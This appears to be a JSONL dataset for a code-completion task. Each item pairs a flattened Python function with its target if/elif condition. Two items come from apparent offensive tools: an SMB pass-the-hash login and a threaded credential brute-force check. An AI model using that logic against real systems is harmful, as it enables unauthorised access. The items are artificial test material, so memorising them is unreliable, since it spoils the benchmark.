{"input": "def get_logsource(self, category, product, service): \"\"\"Return merged log source definition of all logosurces that match criteria across all Sigma conversion configurations in chain.\"\"\" matching = list() for config in self: for logsource in config.logsources: if logsource.matches(category, product, service): matching.append(logsource) if logsource.rewrite is not None: category, product, service = logsource.rewrite return SigmaLogsourceConfiguration(matching, self.defaultindex)", "label": "if logsource . rewrite is not None :"}
{"input": "def fill_squares(self, loc, type): value = type for n in range(self.no_players): self.map_data[loc[0]][loc[1]] = value if type == \"0\": value = chr(ord(value) + 1) loc = self.get_translate_loc(loc)", "label": "if type == \"0\" :"}
{"input": "def _init_ti_table(): global _ti_table _ti_table = [] for fname, name in zip(kc.STRFNAMES, kc.STRNAMES): seq = termcap.get(name) if not seq: continue k = _name_to_key(fname) if k: _ti_table.append((list(bytearray(seq)), k))", "label": "if not seq :"}
{"input": "def OnDelete(self, event): with wx.MessageDialog( self, \"Do you really want to delete the {} {}?\".format( self.getActiveEntity().name, self.entityName ), \"Confirm Delete\", wx.YES | wx.NO | wx.ICON_QUESTION, ) as dlg: dlg.CenterOnParent() if dlg.ShowModal() == wx.ID_YES: self.DoDelete(self.getActiveEntity()) self.refreshEntityList() wx.PostEvent( self.entityChoices, wx.CommandEvent(wx.wxEVT_COMMAND_CHOICE_SELECTED) )", "label": "if dlg . ShowModal ( ) == wx . ID_YES :"}
{"input": "def _add(self, queue): if not queue.routing_key: if queue.exchange is None or queue.exchange.name == \"\": queue.exchange = self.default_exchange queue.routing_key = self.default_routing_key if self.ha_policy: if queue.queue_arguments is None: queue.queue_arguments = {} self._set_ha_policy(queue.queue_arguments) if self.max_priority is not None: if queue.queue_arguments is None: queue.queue_arguments = {} self._set_max_priority(queue.queue_arguments) self[queue.name] = queue return queue", "label": "if queue . exchange is None or queue . exchange . name == \"\" :"}
{"input": "def ParsePlacemark(self, node): ret = Placemark() for child in node.childNodes: if child.nodeName == \"name\": ret.name = self.ExtractText(child) if child.nodeName == \"Point\" or child.nodeName == \"LineString\": ret.coordinates = self.ExtractCoordinates(child) return ret", "label": "if child . nodeName == \"name\" :"}
{"input": "def find_library_nt(name): # modified from ctypes.util # ctypes.util.find_library just returns first result he found # but we want to try them all # because on Windows, users may have both 32bit and 64bit version installed results = [] for directory in os.environ[\"PATH\"].split(os.pathsep): fname = os.path.join(directory, name) if os.path.isfile(fname): results.append(fname) if fname.lower().endswith(\".dll\"): continue fname = fname + \".dll\" if os.path.isfile(fname): results.append(fname) return results", "label": "if fname . lower ( ) . endswith ( \".dll\" ) :"}
{"input": "def _calc_freq(item): try: if ao_index is not None and ro_index is not None: ao = sum([int(x) for x in item.split(\":\")[ao_index].split(\",\")]) ro = int(item.split(\":\")[ro_index]) freq = ao / float(ao + ro) elif af_index is not None: freq = float(item.split(\":\")[af_index]) else: freq = 0.0 except (IndexError, ValueError, ZeroDivisionError): freq = 0.0 return freq", "label": "elif af_index is not None :"}
{"input": "def poll_kafka(self): while True: val = self.do_poll() if val: yield self._emit(val) else: yield gen.sleep(self.poll_interval) if self.stopped: break self._close_consumer()", "label": "if val :"}
{"input": "def resolve_list_field(parent, args, ctx, info): if \"param\" in args: return \"SUCCESS-[{}]\".format( str(args[\"param\"]) if not isinstance(args[\"param\"], list) else \"-\".join([str(item) for item in args[\"param\"]]) ) return \"SUCCESS\"", "label": "if not isinstance ( args [ \"param\" ] , list )"}
{"input": "def login_hash(self, host, username, ntlmhash, domain): lmhash, nthash = ntlmhash.split(\":\") try: self.smbconn[host] = SMBConnection(host, host, sess_port=445, timeout=2) self.smbconn[host].login(username, \"\", domain, lmhash=lmhash, nthash=nthash) if self.smbconn[host].isGuestSession() > 0: color(\"[+] Guest session established on %s...\" % (host)) else: color(\"[+] User session establishd on %s...\" % (host)) return True except Exception as e: color(\"[!] Authentication error occured\") color(\"[!]\", e) return False", "label": "if self . smbconn [ host ] . isGuestSession ( ) > 0 :"}
{"input": "def _add(self, queue): if not queue.routing_key: if queue.exchange is None or queue.exchange.name == \"\": queue.exchange = self.default_exchange queue.routing_key = self.default_routing_key if self.ha_policy: if queue.queue_arguments is None: queue.queue_arguments = {} self._set_ha_policy(queue.queue_arguments) if self.max_priority is not None: if queue.queue_arguments is None: queue.queue_arguments = {} self._set_max_priority(queue.queue_arguments) self[queue.name] = queue return queue", "label": "if queue . queue_arguments is None :"}
{"input": "def safe_delete_pod(self, jobid, ignore_not_found=True): import kubernetes.client body = kubernetes.client.V1DeleteOptions() try: self.kubeapi.delete_namespaced_pod(jobid, self.namespace, body=body) except kubernetes.client.rest.ApiException as e: if e.status == 404 and ignore_not_found: # Can't find the pod. Maybe it's already been # destroyed. Proceed with a warning message. logger.warning( \"[WARNING] 404 not found when trying to delete the pod: {jobid}\\n\" \"[WARNING] Ignore this error\\n\".format(jobid=jobid) ) else: raise e", "label": "if e . status == 404 and ignore_not_found :"}
{"input": "def __init__(self, element, spec): Extension.__init__(self, element, spec) self.spec = spec self.number = tuple(map(int, element.attrib[\"number\"].split(\".\"))) self.api = element.attrib[\"api\"] # not every spec has a ._remove member, but there shouldn't be a remove # tag without that member, if there is, blame me! for removed in chain.from_iterable(element.findall(\"remove\")): if removed.tag == \"type\": continue data = {\"enum\": spec.enums, \"command\": spec.commands}[removed.tag] try: spec.add_remove(self.api, self.number, data[removed.attrib[\"name\"]]) except KeyError: pass # TODO", "label": "if removed . tag == \"type\" :"}
{"input": "def _convert_raw_source(self, source, languages): for row in source: example = self._read_example(row) if example is None: continue for col, lang in zip(self.language_columns, languages): example[col] = lang yield example", "label": "if example is None :"}
{"input": "def check_engine(engine): if engine == \"auto\": if pa is not None: return \"pyarrow\" elif fastparquet is not None: # pragma: no cover return \"fastparquet\" else: # pragma: no cover raise RuntimeError(\"Please install either pyarrow or fastparquet.\") elif engine == \"pyarrow\": if pa is None: # pragma: no cover raise RuntimeError(\"Please install pyarrow fisrt.\") return engine elif engine == \"fastparquet\": if fastparquet is None: # pragma: no cover raise RuntimeError(\"Please install fastparquet first.\") return engine else: # pragma: no cover raise RuntimeError(\"Unsupported engine {} to read parquet.\".format(engine))", "label": "elif fastparquet is not None :"}
{"input": "def TryMerge(self, d): while 1: tt = d.getVarInt32() if tt == 12: break if tt == 18: self.set_value(d.getPrefixedString()) continue if tt == 29: self.set_flags(d.get32()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 12 :"}
{"input": "def handle(self, request): try: if request.message.question[0].rdtype == dns.rdatatype.IXFR: if self.did_truncation: text = ixfr else: text = retry_tcp_ixfr self.did_truncation = True else: text = axfr r = dns.message.from_text(text, one_rr_per_rrset=True, origin=self.origin) r.id = request.message.id return r except Exception: pass", "label": "if self . did_truncation :"}
{"input": "def read_kvfile_todict(file): if not os.path.isfile(file): return {} ret = {} with open(file, \"r\") as FH: for l in FH.readlines(): l = l.strip() # l = l.strip().decode('utf8') if l: (k, v) = re.match(r\"(\\S*)\\s*(.*)\", l).group(1, 2) k = re.sub(\"____\", \" \", k) ret[k] = v return ret", "label": "if l :"}
{"input": "def wrapper(*args, **kwargs): with capture_logs() as logs: try: function(*args, **kwargs) except Exception: # pragma: no cover if logs: print(\"%i errors logged:\" % len(logs), file=sys.stderr) for message in logs: print(message, file=sys.stderr) raise else: if logs: # pragma: no cover for message in logs: print(message, file=sys.stderr) raise AssertionError(\"%i errors logged\" % len(logs))", "label": "if logs :"}
{"input": "def batchSites(self, sites): i = 0 res = list() siteList = list() for site in sites: if i >= self.opts[\"_maxthreads\"]: data = self.threadSites(siteList) if data is None: return res for ret in list(data.keys()): if data[ret]: # bucket:filecount res.append(f\"{ret}:{data[ret]}\") i = 0 siteList = list() siteList.append(site) i += 1 return res", "label": "if data is None :"}
{"input": "def datagram_received(self, data, addr): \"\"\"Handle data from ``addr``.\"\"\" if self.buffer and addr in self.buffer: data = self.buffer.pop(addr) + data while data: idx = data.find(self.separator) if idx >= 0: # we have a full message idx += len(self.separator) chunk, data = data[:idx], data[idx:] self.response(chunk, addr) else: if self.buffer is None: self.buffer = {} self.buffer[addr] = data data = None", "label": "if self . buffer is None :"}
{"input": "def tearDown(self): if self.node: if self.node.client: with patch(\"golem.task.taskserver.TaskServer.quit\"): self.node.client.quit() if self.node._db: self.node._db.close() super().tearDown()", "label": "if self . node . client :"}
{"input": "def _to_sentences(self, lines): text = \"\" sentence_objects = [] for line in lines: if isinstance(line, Sentence): if text: sentences = self.tokenize_sentences(text) sentence_objects += map(self._to_sentence, sentences) sentence_objects.append(line) text = \"\" else: text += \" \" + line text = text.strip() if text: sentences = self.tokenize_sentences(text) sentence_objects += map(self._to_sentence, sentences) return sentence_objects", "label": "if isinstance ( line , Sentence ) :"}
{"input": "def _cloneComponentValues(self, myClone, cloneValueFlag): idx = 0 l = len(self._componentValues) while idx < l: c = self._componentValues[idx] if c is not None: if isinstance(c, base.AbstractConstructedAsn1Item): myClone.setComponentByPosition( idx, c.clone(cloneValueFlag=cloneValueFlag) ) else: myClone.setComponentByPosition(idx, c.clone()) idx = idx + 1", "label": "if isinstance ( c , base . AbstractConstructedAsn1Item ) :"}
{"input": "def split_quality(quality): anyQualities = [] bestQualities = [] for curQual in Quality.qualityStrings.keys(): if curQual & quality: anyQualities.append(curQual) if curQual << 16 & quality: bestQualities.append(curQual) return sorted(anyQualities), sorted(bestQualities)", "label": "if curQual << 16 & quality :"}
{"input": "def make_pattern(wtree): subpattern = [] for part in wtree[1:-1]: if isinstance(part, list): part = make_pattern(part) elif wtree[0] != \"\": for c in part: # Meta-characters cannot be quoted if c in special_chars: raise GlobError() subpattern.append(part) return \"\".join(subpattern)", "label": "if isinstance ( part , list ) :"}
{"input": "def insert_not(self, aList): '''Change \"!\" to \"not\" except before \"=\"''' i = 0 while i < len(aList): if self.is_string_or_comment(aList, i): i = self.skip_string_or_comment(aList, i) elif aList[i] == \"!\" and not self.match(aList, i + 1, \"=\"): aList[i : i + 1] = list(\"not \") i += 4 else: i += 1", "label": "elif aList [ i ] == \"!\" and not self . match ( aList , i + 1 , \"=\" ) :"}
{"input": "def _concretize(self, n_cls, t1, t2, join_or_meet, translate): ptr_class = self._pointer_class() if n_cls is ptr_class: if isinstance(t1, ptr_class) and isinstance(t2, ptr_class): # we need to merge them return ptr_class(join_or_meet(t1.basetype, t2.basetype, translate)) if isinstance(t1, ptr_class): return t1 elif isinstance(t2, ptr_class): return t2 else: # huh? return ptr_class(BottomType()) return n_cls()", "label": "elif isinstance ( t2 , ptr_class ) :"}
{"input": "def pre_validate(self, form): if self.data: values = list(c[0] for c in self.choices) for d in self.data: if d not in values: raise ValueError( self.gettext(\"'%(value)s' is not a valid choice for this field\") % dict(value=d) )", "label": "if d not in values :"}
{"input": "def frontend_visible_config(config_dict): visible_dict = {} for name in CLIENT_WHITELIST: if name.lower().find(\"secret\") >= 0: raise Exception(\"Cannot whitelist secrets: %s\" % name) if name in config_dict: visible_dict[name] = config_dict.get(name, None) if \"ENTERPRISE_LOGO_URL\" in config_dict: visible_dict[\"BRANDING\"] = visible_dict.get(\"BRANDING\", {}) visible_dict[\"BRANDING\"][\"logo\"] = config_dict[\"ENTERPRISE_LOGO_URL\"] return visible_dict", "label": "if name in config_dict :"}
{"input": "def listdir(self, path=None): from azure.storage.blob import Blob dir_path = normalize_storage_path(self._append_path_to_prefix(path)) if dir_path: dir_path += \"/\" items = list() for blob in self.client.list_blobs(self.container, prefix=dir_path, delimiter=\"/\"): if type(blob) == Blob: items.append(self._strip_prefix_from_path(blob.name, dir_path)) else: items.append( self._strip_prefix_from_path( blob.name[: blob.name.find(\"/\", len(dir_path))], dir_path ) ) return items", "label": "if type ( blob ) == Blob :"}
{"input": "def diff(self, resources): model = self.manager.resource_type for r in resources: hlabels = self.resolve_labels(r[\"projectId\"]) if not hlabels: continue delta = False rlabels = r.get(\"labels\", {}) for k, v in hlabels.items(): if k not in rlabels or rlabels[k] != v: delta = True if not delta: continue rlabels = dict(rlabels) rlabels.update(hlabels) if delta: yield (\"update\", model.get_label_params(r, rlabels))", "label": "if delta :"}
{"input": "def favorite(id): note = Note.query.get_or_404(id) if current_user != note.author: abort(403) else: if not note.is_favorite: note.is_favorite = True note.updated_date = datetime.utcnow() db.session.commit() flash(\"Note marked as favorite\") else: note.is_favorite = False note.updated_date = datetime.utcnow() db.session.commit() flash(\"Note removed as favorite\") return redirect(request.referrer)", "label": "if not note . is_favorite :"}
{"input": "def enter_standby_instances(self, group_name, instance_ids, should_decrement): group = self.autoscaling_groups[group_name] original_size = group.desired_capacity standby_instances = [] for instance_state in group.instance_states: if instance_state.instance.id in instance_ids: instance_state.lifecycle_state = \"Standby\" standby_instances.append(instance_state) if should_decrement: group.desired_capacity = group.desired_capacity - len(instance_ids) group.set_desired_capacity(group.desired_capacity) return standby_instances, original_size, group.desired_capacity", "label": "if instance_state . instance . id in instance_ids :"}
{"input": "def _child_complete_hook(self, child_task): if child_task.task_spec == self.main_child_task_spec or self._should_cancel( child_task.task_spec ): for sibling in child_task.parent.children: if sibling != child_task: if sibling.task_spec == self.main_child_task_spec or ( isinstance(sibling.task_spec, BoundaryEvent) and not sibling._is_finished() ): sibling.cancel() for t in child_task.workflow._get_waiting_tasks(): t.task_spec._update(t)", "label": "if sibling != child_task :"}
{"input": "def extract_groups(self, text: str, language_code: str): previous = None group = 1 groups = [] words = [] ignored = IGNORES.get(language_code, {}) for word in NON_WORD.split(text): if not word: continue if word not in ignored and len(word) >= 2: if previous == word: group += 1 elif group > 1: groups.append(group) words.append(previous) group = 1 previous = word if group > 1: groups.append(group) words.append(previous) return groups, words", "label": "if word not in ignored and len ( word ) >= 2 :"}
{"input": "def runTest(self): \"\"\"This function will call api providing list of op_class\"\"\" if self.is_positive_test: response = indexes_utils.api_create_index_get_op_class(self) else: if self.mocking_required: with patch( self.mock_data[\"function_name\"], side_effect=eval(self.mock_data[\"return_value\"]), ): response = indexes_utils.api_create_index_get_op_class(self) indexes_utils.assert_status_code(self, response)", "label": "if self . mocking_required :"}
{"input": "def fn(value=None): for i in [-1, 0, 1, 2, 3, 4]: if i < 0: continue elif i == 0: yield 0 elif i == 1: yield 1 i = 0 yield value yield 2 else: try: v = i / value except: v = i yield v", "label": "if i < 0 :"}
{"input": "def _update(self, flag): self._modified = False self._index = {} try: f = _io.open(self._dirfile, \"r\", encoding=\"Latin-1\") except OSError: if flag not in (\"c\", \"n\"): raise self._modified = True else: with f: for line in f: line = line.rstrip() key, pos_and_siz_pair = _ast.literal_eval(line) key = key.encode(\"Latin-1\") self._index[key] = pos_and_siz_pair", "label": "if flag not in ( \"c\" , \"n\" ) :"}
{"input": "def _network_connections_in_results(data): for plugin_name, plugin_result in data.iteritems(): if plugin_result[\"status\"] == \"error\": continue if \"device\" not in plugin_result: continue if \"connections\" in plugin_result[\"device\"]: for conn in plugin_result[\"device\"][\"connections\"]: if conn[\"connection_type\"] == ConnectionType.network.name: return True return False", "label": "if \"device\" not in plugin_result :"}
{"input": "def close(self) -> None: \"\"\"Stop accepting writes and write file, if needed.\"\"\" if not self._io: raise Exception(\"FileAvoidWrite does not support empty files.\") buf = self.getvalue() self._io.close() try: with open(self._path, encoding=\"utf-8\") as old_f: old_content = old_f.read() if old_content == buf: return except OSError: pass with open(self._path, \"w\", encoding=\"utf-8\") as f: f.write(buf)", "label": "if old_content == buf :"}
{"input": "def _extract_changes(doc_map, changes, read_time): deletes = [] adds = [] updates = [] for name, value in changes.items(): if value == ChangeType.REMOVED: if name in doc_map: deletes.append(name) elif name in doc_map: if read_time is not None: value.read_time = read_time updates.append(value) else: if read_time is not None: value.read_time = read_time adds.append(value) return (deletes, adds, updates)", "label": "if value == ChangeType . REMOVED :"}
{"input": "def preprocess( self, X: DataFrame, is_train=False, vect_max_features=1000, model_specific_preprocessing=False, ): X = super().preprocess(X=X) if ( model_specific_preprocessing ): # This is hack to work-around pre-processing caching in bagging/stacker models if is_train: feature_types = self._get_types_of_features(X) X = self.preprocess_train(X, feature_types, vect_max_features) else: X = self.pipeline.transform(X) return X", "label": "if is_train :"}
{"input": "def setup_child(self, child): child.parent = self if self.document: child.document = self.document if child.source is None: child.source = self.document.current_source if child.line is None: child.line = self.document.current_line", "label": "if child . source is None :"}
{"input": "def _compute_early_outs(self, quotas): for q in quotas: if q.closed and not self._ignore_closed: self.results[q] = Quota.AVAILABILITY_ORDERED, 0 elif q.size is None: self.results[q] = Quota.AVAILABILITY_OK, None elif q.size == 0: self.results[q] = Quota.AVAILABILITY_GONE, 0", "label": "if q . closed and not self . _ignore_closed :"}
{"input": "def parse_function(self, l): bracket = l.find(\"(\") fname = l[8:bracket] if self.properties: if self.properties[0] == \"propget\": self.props[fname] = 1 self.propget[fname] = 1 elif self.properties[0] == \"propput\": self.props[fname] = 1 self.propput[fname] = 1 else: self.functions[fname] = 1 self.properties = None", "label": "if self . properties [ 0 ] == \"propget\" :"}
{"input": "def SetHelpListButtonStates(self): if self.listHelp.size() < 1: # no entries in list self.buttonHelpListEdit.config(state=DISABLED) self.buttonHelpListRemove.config(state=DISABLED) else: # there are some entries if self.listHelp.curselection(): # there currently is a selection self.buttonHelpListEdit.config(state=NORMAL) self.buttonHelpListRemove.config(state=NORMAL) else: # there currently is not a selection self.buttonHelpListEdit.config(state=DISABLED) self.buttonHelpListRemove.config(state=DISABLED)", "label": "if self . listHelp . curselection ( ) :"}
{"input": "def param_names() -> FrozenSet[Tuple[str, str]]: \"\"\"Returns all module and parameter names as a set of pairs.\"\"\" out = [] params = current_frame().params for mod_name, bundle in params.items(): if not isinstance(bundle, Mapping): # TODO(tomhennigan) Fix broken user code and remove this warning. warnings.warn(f\"Invalid entry {mod_name!r} in params {params}\") continue for name in bundle: out.append((mod_name, name)) return frozenset(out)", "label": "if not isinstance ( bundle , Mapping ) :"}
{"input": "def _classify_volume(self, ctxt, volumes): normal_volumes = [] replica_volumes = [] for v in volumes: volume_type = self._get_volume_replicated_type(ctxt, v) if volume_type and v.status == \"available\": replica_volumes.append(v) else: normal_volumes.append(v) return normal_volumes, replica_volumes", "label": "if volume_type and v . status == \"available\" :"}
{"input": "def undump_descriptions_of_all_objects(inf): d = {} for l in inf: dash = l.find(\"-\") if dash == -1: raise l mo = NRE.search(l) if mo: typstr = l[dash + 1 : mo.start(0)] num = int(mo.group(0)) if str(num) != mo.group(0): raise mo.group(0) else: typstr = l[dash + 1 :] num = None d[l[:dash]] = ( typstr, num, ) return d", "label": "if mo :"}
{"input": "def _real_len(self, s): s_len = 0 in_esc = False prev = \" \" for c in replace_all({\"\\0+\": \"\", \"\\0-\": \"\", \"\\0^\": \"\", \"\\1\": \"\", \"\\t\": \" \"}, s): if in_esc: if c == \"m\": in_esc = False else: if c == \"[\" and prev == \"\\033\": in_esc = True s_len -= 1 # we counted prev when we shouldn't have else: s_len += self._display_len(c) prev = c return s_len", "label": "if in_esc :"}
{"input": "def update_all(self, include_description=False): if self.background_update is None: episodes = [row[self.C_EPISODE] for row in self] else: # Update all episodes that have already been initialized... episodes = [ row[self.C_EPISODE] for index, row in enumerate(self) if index < self.background_update.index ] # ...and also include episodes that still need to be initialized episodes.extend(self.background_update.episodes) self._update_from_episodes(episodes, include_description)", "label": "if index < self . background_update . index"}
{"input": "def _debug_log(self, text, level): if text and \"log\" in self.config.sys.debug: if not text.startswith(self.log_prefix): text = \"%slog(%s): %s\" % (self.log_prefix, level, text) if self.log_parent is not None: return self.log_parent.log(level, text) else: self.term.write(self._fmt_log(text, level=level))", "label": "if not text . startswith ( self . log_prefix ) :"}
{"input": "def save_new_objects(self, commit=True): self.new_objects = [] for form in self.extra_forms: if not form.has_changed(): continue # If someone has marked an add form for deletion, don't save the # object. if self.can_delete and self._should_delete_form(form): continue self.new_objects.append(self.save_new(form, commit=commit)) if not commit: self.saved_forms.append(form) return self.new_objects", "label": "if not commit :"}
{"input": "def get_master_info(accounts_config, master): master_info = None for a in accounts_config[\"accounts\"]: if a[\"name\"] == master: master_info = a break if a[\"account_id\"] == master: master_info = a break if master_info is None: raise ValueError(\"Master account: %s not found in accounts config\" % (master)) return master_info", "label": "if a [ \"name\" ] == master :"}
{"input": "def update(attr, value=None): if value is not None: setattr(draft, attr, value) if attr == \"body\": # Update size, snippet too draft.size = len(value) draft.snippet = draft.calculate_html_snippet(value)", "label": "if attr == \"body\" :"}
{"input": "def _process_property_change(self, msg): msg = super(Select, self)._process_property_change(msg) if \"value\" in msg: if not self.values: pass elif msg[\"value\"] is None: msg[\"value\"] = self.values[0] else: if isIn(msg[\"value\"], self.unicode_values): idx = indexOf(msg[\"value\"], self.unicode_values) else: idx = indexOf(msg[\"value\"], self.labels) msg[\"value\"] = self._items[self.labels[idx]] msg.pop(\"options\", None) return msg", "label": "elif msg [ \"value\" ] is None :"}
{"input": "def removeEmptyDir(path, removeRoot=True): if not os.path.isdir(path): return # remove empty subfolders _files = os.listdir(path) if len(_files) > 0: for f in _files: if not f.startswith(\".\") and not f.startswith(\"_\"): fullpath = os.path.join(path, f) if os.path.isdir(fullpath): removeEmptyDir(fullpath) # if folder empty, delete it _files = os.listdir(path) if len(_files) == 0 and removeRoot: Print.info(\"Removing empty folder:\" + path) os.rmdir(path)", "label": "if os . path . isdir ( fullpath ) :"}
{"input": "def make_relative_to(self, kwds, relative_to): if relative_to and os.path.dirname(relative_to): dirname = os.path.dirname(relative_to) kwds = kwds.copy() for key in ffiplatform.LIST_OF_FILE_NAMES: if key in kwds: lst = kwds[key] if not isinstance(lst, (list, tuple)): raise TypeError(\"keyword '%s' should be a list or tuple\" % (key,)) lst = [os.path.join(dirname, fn) for fn in lst] kwds[key] = lst return kwds", "label": "if not isinstance ( lst , ( list , tuple ) ) :"}
{"input": "def ending(self, state): print_title(\" STABLE PINS \") path_lists = trace_graph(state.graph) for k in sorted(state.mapping): print(state.mapping[k].as_line(include_hashes=False)) paths = path_lists[k] for path in paths: if path == [None]: print(\" User requirement\") continue print(\" \", end=\"\") for v in reversed(path[1:]): line = state.mapping[v].as_line(include_hashes=False) print(\" <=\", line, end=\"\") print() print()", "label": "if path == [ None ] :"}
{"input": "def fetch(): retval = {} content = retrieve_content(__url__) if __check__ in content: for line in content.split(\"\\n\"): line = line.strip() if not line or line.startswith(\"#\") or \".\" not in line: continue if \" # \" in line: reason = line.split(\" # \")[1].split()[0].lower() if reason == \"scanning\": # too many false positives continue retval[line.split(\" # \")[0]] = (__info__, __reference__) return retval", "label": "if not line or line . startswith ( \"#\" ) or \".\" not in line :"}
{"input": "def __str__(self): \"\"\"Returns human readable string representation, useful for debugging.\"\"\" buf = StringIO() for idx, (class_batch_id, class_val) in enumerate(iteritems(self.data)): if idx >= TO_STR_MAX_BATCHES: buf.write(u\" ...\\n\") break buf.write(u' ClassBatch \"{0}\"\\n'.format(class_batch_id)) buf.write(u\" {0}\\n\".format(str(class_val))) return buf.getvalue()", "label": "if idx >= TO_STR_MAX_BATCHES :"}
{"input": "def find_caller(stack): \"\"\"Finds info about first non-sqlalchemy call in stack\"\"\" for frame in stack: # We don't care about sqlalchemy internals module = inspect.getmodule(frame[0]) if not hasattr(module, \"__name__\"): continue if module.__name__.startswith(\"sqlalchemy\"): continue return (module.__name__,) + tuple(frame[2:4]) + (frame[4][0].strip(),) log.warning(\"Transaction from unknown origin\") return None, None, None, None", "label": "if module . __name__ . startswith ( \"sqlalchemy\" ) :"}
{"input": "def format_unencoded(self, tokensource, outfile): if self.linenos: self._write_lineno(outfile) for ttype, value in tokensource: color = self._get_color(ttype) for line in value.splitlines(True): if color: outfile.write(\"<%s>%s</>\" % (color, line.rstrip(\"\\n\"))) else: outfile.write(line.rstrip(\"\\n\")) if line.endswith(\"\\n\"): if self.linenos: self._write_lineno(outfile) else: outfile.write(\"\\n\") if self.linenos: outfile.write(\"\\n\")", "label": "if color :"}
{"input": "def __new__(cls, name, bases, attrs): klass = type.__new__(cls, name, bases, attrs) if \"cmds\" in attrs: cmds = attrs[\"cmds\"] if isinstance(cmds, str): cmd_handler_mapping[cmds] = klass else: for cmd in cmds: cmd_handler_mapping[cmd] = klass return klass", "label": "if isinstance ( cmds , str ) :"}
{"input": "def __getattr__(self, key): if key == key.upper(): if hasattr(self._django_settings, key): return getattr(self._django_settings, key) elif hasattr(self._default_settings, key): return getattr(self._default_settings, key) raise AttributeError( \"%r object has no attribute %r\" % (self.__class__.__name__, key) )", "label": "if hasattr ( self . _django_settings , key ) :"}
{"input": "def download_file(url): local_filename = url.split(\"/\")[-1] outfile = os.path.join(AVATAR_DIR, local_filename) if not os.path.isfile(outfile): r = requests.get(url, stream=True) with open(outfile, \"wb\") as f: for chunk in r.iter_content(chunk_size=1024): if chunk: # filter out keep-alive new chunks f.write(chunk) f.flush() return local_filename", "label": "if chunk :"}
{"input": "def check_default(self): if self.check(): self.credentials = [] data = LockedIterator(itertools.product(self.usernames, self.passwords)) self.run_threads(self.threads, self.target_function, data) if self.credentials: return self.credentials return None", "label": "if self . credentials :"}
{"input": "def _process_frame(self, frame_num, frame_im, callback=None): # type(int, numpy.ndarray) -> None \"\"\"Adds any cuts detected with the current frame to the cutting list.\"\"\" for detector in self._detector_list: cuts = detector.process_frame(frame_num, frame_im) if cuts and callback: callback(frame_im, frame_num) self._cutting_list += cuts for detector in self._sparse_detector_list: events = detector.process_frame(frame_num, frame_im) if events and callback: callback(frame_im, frame_num) self._event_list += events", "label": "if events and callback :"}
{"input": "def parse(cls, api, json): user = cls(api) setattr(user, \"_json\", json) for k, v in json.items(): if k == \"created_at\": setattr(user, k, parse_datetime(v)) elif k == \"status\": setattr(user, k, Status.parse(api, v)) elif k == \"following\": # twitter sets this to null if it is false if v is True: setattr(user, k, True) else: setattr(user, k, False) else: setattr(user, k, v) return user", "label": "elif k == \"following\" :"}
{"input": "def dump_token_list(tokens): for token in tokens: if token.token_type == TOKEN_TEXT: writer.write(token.contents) elif token.token_type == TOKEN_VAR: writer.print_expr(token.contents) touch_var(token.contents)", "label": "if token . token_type == TOKEN_TEXT :"}
{"input": "def parent_path(path): parent_dir = S3FileSystem._append_separator(path) if not s3.is_root(parent_dir): bucket_name, key_name, basename = s3.parse_uri(path) if not basename: # bucket is top-level so return root parent_dir = S3A_ROOT else: bucket_path = \"%s%s\" % (S3A_ROOT, bucket_name) key_path = \"/\".join(key_name.split(\"/\")[:-1]) parent_dir = s3.abspath(bucket_path, key_path) return parent_dir", "label": "if not basename :"}
{"input": "def write_framed_message(self, message): message_length = len(message) total_bytes_sent = 0 while message_length - total_bytes_sent > 0: if message_length - total_bytes_sent > BUFFER_SIZE: buffer_length = BUFFER_SIZE else: buffer_length = message_length - total_bytes_sent self.write_buffer( message[total_bytes_sent : (total_bytes_sent + buffer_length)] ) total_bytes_sent += buffer_length # A message is always terminated by a zero-length buffer. self.write_buffer_length(0)", "label": "if message_length - total_bytes_sent > BUFFER_SIZE :"}
{"input": "def reader(): with tarfile.open(filename, mode=\"r\") as f: names = (each_item.name for each_item in f if sub_name in each_item.name) while True: for name in names: if six.PY2: batch = pickle.load(f.extractfile(name)) else: batch = pickle.load(f.extractfile(name), encoding=\"bytes\") for item in read_batch(batch): yield item if not cycle: break", "label": "if not cycle :"}
{"input": "def splitOn(sequence, predicate, transformers): result = [] mode = predicate(sequence[0]) tmp = [sequence[0]] for e in sequence[1:]: p = predicate(e) if p != mode: result.extend(transformers[mode](tmp)) tmp = [e] mode = p else: tmp.append(e) result.extend(transformers[mode](tmp)) return result", "label": "if p != mode :"}
{"input": "def stroke(s): keys = [] on_left = True for k in s: if k in \"EU*-\": on_left = False if k == \"-\": continue elif k == \"*\": keys.append(k) elif on_left: keys.append(k + \"-\") else: keys.append(\"-\" + k) return Stroke(keys)", "label": "elif on_left :"}
{"input": "def check(data_dir, decrypter, read_only=False): fname = os.path.join(data_dir, DIGEST_NAME) if os.path.exists(fname): if decrypter is None: return False f = open(fname, \"rb\") s = f.read() f.close() return decrypter.decrypt(s) == MAGIC_STRING else: if decrypter is not None: if read_only: return False else: s = decrypter.encrypt(MAGIC_STRING) f = open(fname, \"wb\") f.write(s) f.close() return True", "label": "if read_only :"}
{"input": "def get_sentence(self): while True: self._seed += 1 all_files = list(self._all_files) if self._shuffle: if self._n_gpus > 1: random.seed(self._seed) random.shuffle(all_files) for file_path in all_files: for ret in self._load_file(file_path): yield ret if self._mode == \"test\": break", "label": "if self . _mode == \"test\" :"}
{"input": "def on_epoch_end(self, batch, logs=None): # At the end of every epoch, remask the weights. This ensures that when # the model is saved after completion, the weights represent mask*weights. weight_mask_ops = [] for layer in self.prunable_layers: if isinstance(layer, pruning_wrapper.PruneLowMagnitude): if tf.executing_eagerly(): layer.pruning_obj.weight_mask_op() else: weight_mask_ops.append(layer.pruning_obj.weight_mask_op()) K.batch_get_value(weight_mask_ops)", "label": "if isinstance ( layer , pruning_wrapper . PruneLowMagnitude ) :"}
{"input": "def stroke(s): keys = [] on_left = True for k in s: if k in \"EU*-\": on_left = False if k == \"-\": continue elif k == \"*\": keys.append(k) elif on_left: keys.append(k + \"-\") else: keys.append(\"-\" + k) return Stroke(keys)", "label": "if k in \"EU*-\" :"}
{"input": "def _plot_figure(self, idx): with self.renderer.state(): self.plot.update(idx) if self.renderer.fig == \"auto\": figure_format = self.renderer.params(\"fig\").objects[0] else: figure_format = self.renderer.fig return self.renderer._figure_data(self.plot, figure_format, as_script=True)[0]", "label": "if self . renderer . fig == \"auto\" :"}
